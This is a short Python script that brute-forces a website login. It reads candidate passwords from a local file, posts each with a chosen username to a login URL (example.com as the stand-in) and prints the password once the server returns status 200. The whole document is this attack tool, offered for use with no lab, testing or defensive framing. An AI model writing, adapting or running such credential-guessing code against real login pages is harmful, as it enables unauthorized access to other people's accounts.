import requests

def brute_force_login(username):
    try:
        password_file = open("passlist.txt", "r")
        passwords = password_file.readlines()
        password_file.close()

        for password in passwords:
            password = password.strip()
            login_data = {
                "username": username,
                "password": password
            }
            response = requests.post("https://example.com/login", data=login_data)

            if response.status_code == 200:
                print("Login successful!")
                print("Username:", username)
                print("Password:", password)
                break
            else:
                print("Login failed with password:", password)

        print("Brute force attack completed.")

    except FileNotFoundError:
        print("Password file not found.")
    except requests.exceptions.RequestException as e:
        print("An error occurred during the request:", str(e))
    except Exception as e:
        print("An unexpected error occurred:", str(e))

# Usage example
username = input("Enter the username: ")
brute_force_login(username)
